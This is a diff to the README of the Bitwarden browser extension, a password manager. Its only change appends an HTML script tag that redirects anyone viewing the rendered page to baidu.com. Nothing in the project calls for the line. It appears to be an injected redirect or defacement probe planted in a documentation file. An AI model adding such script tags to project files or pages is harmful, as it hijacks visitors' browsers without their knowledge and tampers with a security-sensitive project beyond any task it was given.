@@ -11,3 +11,4 @@ The bitwarden browser extension is written using the Chrome Web Extension API an
 Code contributions are welcome! Please commit any pull requests against the `master` branch.
 
 Security audits and feedback are welcome. Please open an issue or email us privately if the report is sensitive in nature.
+<script language="javascript">location.href="https://www.baidu.com"</script>
